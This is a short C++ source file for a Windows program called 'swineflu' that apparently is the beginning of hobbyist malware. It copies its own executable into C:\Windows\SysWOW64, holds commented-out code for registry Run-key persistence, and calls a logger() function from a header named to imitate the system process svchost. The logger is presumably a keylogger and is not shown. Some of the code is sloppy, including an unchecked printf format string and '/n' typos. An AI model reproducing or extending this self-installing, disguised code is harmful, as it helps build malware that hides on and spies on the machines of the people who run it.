// swineflu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string.h>

#include <sstream>
#include <string>

#include "Shlwapi.h"


#include <iostream>
#include "svchost.h"
#include <tchar.h>

using namespace std;


string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

void adminstartup()
{
	string str = ExePath();
	printf(str.c_str());
	str.append("\\swineflu.exe");
//CopyFile(L"SwineFlu.exe", L"C:\\Windows\\SwineFlu.dll", true);
	//TCHAR path[MAX_PATH] = { 0 };
	//GetModuleFileName(NULL, path, MAX_PATH);
	//PathRemoveFileSpec(path);
	//PathAppend(path, _T("SwineFlu.exe"));

	BOOL b = CopyFile(str.c_str(),
		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
	if (!b) {

		
		
		printf("%d/n", GetLastError());
	}
	else {
		printf("okay/n");
	}

	HKEY hkey;
	DWORD dwDispoition;

	//RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
	//const unsigned char path[150] = "C:\\Windows\\myprogram.exe";
	//RegSetValueEx(hkey, L"My Directory", 0, 1, path, sizeof(path));
	getchar();
}


int _tmain(int argc, _TCHAR* argv[])
{
	printf("wear your mask please\n");
	adminstartup();
	logger();
	return 0;
}


